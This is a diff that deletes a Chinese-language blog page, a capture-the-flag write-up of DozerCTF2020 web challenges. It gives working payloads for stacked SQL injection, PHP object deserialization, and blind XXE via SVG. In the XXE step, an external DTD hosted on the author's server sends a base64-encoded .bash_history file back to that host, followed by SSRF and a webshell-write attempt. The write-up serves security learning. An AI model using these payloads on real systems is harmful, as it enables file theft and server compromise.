@@ -1,592 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num &#43;= 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?'><title>DozerCTF2020_web</title>
-
-<link rel='canonical' href='https://anthem-whisper.github.io/tmp/dozerctf2020_web/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='DozerCTF2020_web'>
-<meta property='og:description' content='又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num &#43;= 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?'>
-<meta property='og:url' content='https://anthem-whisper.github.io/tmp/dozerctf2020_web/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Tmp' />
-<meta name="twitter:title" content="DozerCTF2020_web">
-<meta name="twitter:description" content="又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了
- sqli-labs 0 考点：URL二次编码，堆叠注入
-堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。
-查看库名：
-?id=1%2527;show%20databases;%23 查看表名：
-?id=1%2527;show%20tables;%23查看表的第一条数据：
-?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 flag{594cb6af684ad354b4a59ac496473990}
-白给的反序列化 考点：PHP反序列化
-开题送码：
-&amp;lt;?phpclass home{private $method;private $args;function __construct($method, $args){$this-&amp;gt;method = $method;$this-&amp;gt;args = $args;}function __destruct(){if (in_array($this-&amp;gt;method, array(&amp;quot;mysys&amp;quot;))) {call_user_func_array(array($this, $this-&amp;gt;method), $this-&amp;gt;args);}}function mysys($path){print_r(base64_encode(exec(&amp;quot;cat $path&amp;quot;)));}function waf($str){if (strlen($str) &amp;gt; 8) {die(&amp;quot;No&amp;quot;);}return $str;}function __wakeup(){$num = 0;foreach ($this-&amp;gt;args as $k =&amp;gt; $v) {$this-&amp;gt;args[$k] = $this-&amp;gt;waf(trim($v));$num &#43;= 1;if ($num &amp;gt; 2) {die(&amp;quot;No&amp;quot;);}}}}if ($_GET[&#39;path&#39;]) {$path = @$_GET[&#39;path&#39;];unserialize($path);} else {highlight_file(__FILE__);}?">
-    </head>
-    <body class="article-page keep-sidebar">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended ">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全和代码审计</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>暗色模式</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/tmp/dozerctf2020_web/">DozerCTF2020_web</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <p>又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了</p>
-<hr>
-<h3 id="sqli-labs-0">sqli-labs 0</h3>
-<p>考点：URL二次编码，堆叠注入</p>
-<p>堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。</p>
-<p>查看库名：</p>
-<pre><code>?id=1%2527;show%20databases;%23 
-</code></pre><p>查看表名：</p>
-<pre><code>?id=1%2527;show%20tables;%23
-</code></pre><p>查看表的第一条数据：</p>
-<pre><code>?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 
-</code></pre><p>flag{594cb6af684ad354b4a59ac496473990}</p>
-<h3 id="白给的反序列化">白给的反序列化</h3>
-<p>考点：PHP反序列化</p>
-<p>开题送码：</p>
-<pre><code>&lt;?php
-
-class home
-{
-    private $method;
-    private $args;
-    function __construct($method, $args)
-    {
-        $this-&gt;method = $method;
-        $this-&gt;args = $args;
-    }
-
-    function __destruct()
-    {
-        if (in_array($this-&gt;method, array(&quot;mysys&quot;))) {
-            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);
-        }
-    }
-
-    function mysys($path)
-    {
-        print_r(base64_encode(exec(&quot;cat $path&quot;)));
-    }
-    function waf($str)
-    {
-        if (strlen($str) &gt; 8) {
-            die(&quot;No&quot;);
-        }
-        return $str;
-    }
-
-    function __wakeup()
-    {
-        $num = 0;
-        foreach ($this-&gt;args as $k =&gt; $v) {
-            $this-&gt;args[$k] = $this-&gt;waf(trim($v));
-            $num += 1;
-            if ($num &gt; 2) {
-                die(&quot;No&quot;);
-            }
-        }
-    }
-}
-
-if ($_GET['path']) {
-    $path = @$_GET['path'];
-    unserialize($path);
-} else {
-    highlight_file(__FILE__);
-
-}
-?&gt;
-</code></pre><p>核心是在 <code>mysys</code> 函数，可以返回base64编码之后的exec内容；</p>
-<p>而 <code>__destruct</code> 里面首先是一个 <code>in_array</code> 的判断，如果 <code>$this-&gt;method</code> 的值是在一个数组里面的话，就执行 <code>call_user_func_array</code> ，而这个数组只有一个元素那就是 <code>mysys</code> ，所以我们method就传入mysys字符串就行。</p>
-<p>至于call_user_func_array，PHP手册是这样写的：</p>
-<pre><code>mixed call_user_func_array ( callable $callback , array $param_arr )
-把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。
-
-callback
-  被调用的回调函数。
-param_arr
-  要被传入回调函数的数组，这个数组得是索引数组。
-</code></pre><p>那么我们只需要给 <code>$args</code> 赋一个数组就行了；</p>
-<pre><code>'''
-  题目源码
-'''
-
-$pop = new home('mysys',array('flag.php'));
-echo serialize($pop);
-</code></pre><p>得到 <code>O:4:&quot;home&quot;:2:{s:12:&quot; home method&quot;;s:5:&quot;mysys&quot;;s:10:&quot; home args&quot;;a:1:{i:0;s:8:&quot;flag.php&quot;;}}</code> 注入private对象加个%00就行。</p>
-<p>payload:</p>
-<pre><code>?path=O:4:&quot;home&quot;:2:{s:12:&quot;%00home%00method&quot;;s:5:&quot;mysys&quot;;s:10:&quot;%00home%00args&quot;;a:1:{i:0;s:8:&quot;flag.php&quot;;}}
-</code></pre><p>flag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}</p>
-<h3 id="简单域渗透-flag1">简单域渗透-flag1</h3>
-<p>考点：CVE-2020-7961 Liferay Portal 反序列化</p>
-<p>请移步本站：<a class="link" href="http://wh1sper.com/cve-2020-7961liferay-portal-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-%e5%a4%8d%e7%8e%b0/"  target="_blank" rel="noopener"
-    >CVE-2020-7961 Liferay Portal 反序列化-复现</a></p>
-<h3 id="svgggggg">svgggggg!</h3>
-<p>考点：XXE盲打，SSRF，sqli写shell</p>
-<p>打开题目，叫我们给一个URL，然后check这个URL指向的file是不是svg图片</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171235.png" alt="img"  /></p>
-<h4 id="什么是svg">什么是SVG？</h4>
-<ul>
-<li>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)</li>
-<li>SVG 用来定义用于网络的基于矢量的图形</li>
-<li>SVG 使用 XML 格式定义图形</li>
-<li>SVG 图像在放大或改变尺寸的情况下其图形质量不会有所损失</li>
-<li>SVG 是万维网联盟的标准</li>
-<li>SVG 与诸如 DOM 和 XSL 之类的 W3C 标准是一个整体</li>
-</ul>
-<p>由于SVG是基于XML的矢量图，因此可以支持Entity（实体）功能。</p>
-<p>我们自然而然地想到了XXE。</p>
-<h4 id="利用svg进行xxe攻击">利用SVG进行XXE攻击</h4>
-<p>我从网上搜索了一个SVG图片的源码，改装了一下，在VPS上面命名为 <code>1.svg</code> ：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE fortiguard [ 
-&lt;!ENTITY lab &quot;HELLO&quot;&gt;
-]&gt;
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;
-  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;	
-&lt;/svg&gt;
-</code></pre><p>提交地址，我们发现我们的实体已经起作用了（这里只是因为挡住了，但是F12可以看到）</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171246.png" alt="img"  /></p>
-<p>那么大致就能实锤是XXE；</p>
-<p>尝试直接读取文件：</p>
-<p>1.svg</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE fortiguard [ 
-&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;
-]&gt;
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;
-  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;
-&lt;/svg&gt;
-</code></pre><p>当然不可能这么简单，页面虽然正常返回信息，但是我们并不能直接读到我们想要的东西；</p>
-<p>无回显，但是又是XXE，我们又自然地想到了XXE盲打，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。</p>
-<p>构造 <code>entity.svg</code> :</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE fortiguard [ 
-&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;
-&lt;!ENTITY % file SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;
-&lt;!ENTITY % dtd SYSTEM &quot;http://IP:端口/1.dtd&quot;&gt;
-%dtd;
-%send;
-]&gt;
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;
-        &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;
-&lt;/svg&gt;
-</code></pre><p>构造 <code>1.dtd</code> ：</p>
-<pre><code>&lt;!ENTITY % all
-        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://IP:端口/?%file;'&gt;&quot;
-&gt;
-%all;
-</code></pre><p>发送 <code>entity.svg</code> 地址；</p>
-<p>我们可以看到dtd文件实际上已经被加载了，但是却没有收到读取文件之后的请求</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171303.png" alt="img"  /></p>
-<p>判断问题出在读文件那一步，但是倘若我们读取的文件是一个不存在的文件，比如file:///xxx/xx.x，那么我们发送svg文件地址之后，页面是没有回显内容的；
-但是如果我们读取的是一个存在的文件，页面会有回显内容。</p>
-<p>那么我们可以推测，读文件是读到了，但是在发包的时候出了问题。</p>
-<p>问题就出在换行和空格。</p>
-<p>因为是GET请求发送到VPS，所以我们不能有换行和空格，不然就会400。</p>
-<p>解决方法当然是base64。xml解析器支持使用php://filter进行编码</p>
-<p>修改 <code>entity.svg</code> :</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE fortiguard [ 
-&lt;!ENTITY lab SYSTEM &quot;file:///home/r1ck/.bash_history&quot;&gt;
-&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;&gt;
-&lt;!ENTITY % dtd SYSTEM &quot;http://59.110.157.4:8000/1.dtd&quot;&gt;
-%dtd;
-%send;
-]&gt;
-&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; height=&quot;200&quot; width=&quot;200&quot;&gt;
-        &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;
-&lt;/svg&gt;
-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171320.png" alt="img"  /></p>
-<p>读到了.bash_history：</p>
-<pre><code>cd /app
-php -S 0.0.0.0:8080
-</code></pre><p>明显是SSRF打内网；</p>
-<h4 id="利用xxe打ssrf">利用XXE打SSRF</h4>
-<p>修改 <code>entity.svg</code> ，得到 <code>127.0.0.1:8080</code> 的源码：</p>
-<pre><code>&lt;!doctype html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;meta charset=&quot;UTF-8&quot;&gt;
-&lt;title&gt;index&lt;/title&gt;
-&lt;/head&gt;
-Hi!
-You Find Me .
-Flag is nearby.
-&lt;body&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
-Array
-(
-    [id] =&gt; 1
-    [name] =&gt; test
-)
-</code></pre><p>可以看到是个sqli；</p>
-<p>根据hint，我们需要直接getshell，测出来没有堆叠，但是可以联合查询</p>
-<p>这里我们使用union select直接写一个shell到/app目录；</p>
-<p>但是到了这里遇到了玄学原因，php一句话写进去会莫名其妙消失，等开源之后本地复现；</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-     
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2019 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
